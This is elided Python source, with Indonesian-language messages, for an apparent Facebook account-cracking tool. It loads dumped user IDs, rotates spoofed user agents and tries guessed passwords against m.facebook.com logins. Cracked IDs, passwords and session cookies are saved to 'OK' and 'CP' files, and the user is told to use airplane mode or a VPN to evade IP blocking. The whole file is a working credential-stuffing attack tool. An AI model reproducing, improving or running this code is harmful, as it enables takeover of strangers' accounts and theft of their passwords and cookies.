...
#	g='Mozilla/5.0 (Linux; Android 11; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mozilla/5.0 (Linux; Android 7.1.1; Build/LMY47O.H18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/shinzy12/Xyz/blob/main/User-agent.txt').text
...
def banner():
	clear()
	wel='# SCRIPT INI BERSIFAT PRIVASI, JADI JIKA INGIN MENGGUNAKAN WAJIB LAPOR AUTHOR'
...
TYPE PROXY=AKTIF'''
	oi = nel(tekz(ban,justify='center',style='bold green'), style='red')
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/SHIN-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def setting():
	...
	teks = '[01] CRACK DARI AKUN TER TUA\n[02] CRACK DARI AKUN TER MUDA\n[03] CRACK RANDOM ID'
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: sayang,sayangku,sayang123,bismillah,anjing,katasandi'
...
def passwrd():
	...
	krek = '[•] HASIL LIVE TERSIMPAN DI : INTERNAL MEMORY/DATA/OK/%s\n[•] HASIL CEKPOIN TERSIMPAN DI : INTERNAL MEMORY/DATA/CP/%s\nMODE PESAWAT SETIAP 500-1000 ID AGAR TDAK TERJADI SPAM IP, JIKA MASIH TERKENA SPAM, USAHAKAN AKTIFKAN VPN SELAMA 5 MENIT LALU DIAMKAN HANDPHONE SEJENAK, TRIMAKASIH'%(okc,cpc)
...
#	Mozilla/5.0 (Linux; Android 10; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36'
...
#tapyes			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms,zh-HK,zh;q=0.9,en-US,en-GB,ja-JP;q=0.8,en;q=0.7'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='SHIN-XZY CP'))
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/SHIN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'✓ {idf} • {pw}\n✓ COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='SHIN-XZY LIVE'))
					ok+=1
					break
					...
					print('\n')
					statusok = f'[bold green]\r✓ {idf} • {pw}\n✓ COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/SHIN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
		...
		try:
			...
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					...
					if opsinya=='':
						try:
							open('/sdcard/SHIN-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
						except:
							open('/sdcard/SHIN-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/SHIN-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/SHIN-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/SHIN-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/SHIN-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/SHIN-DATA/DUMP')
	except:pass
	login()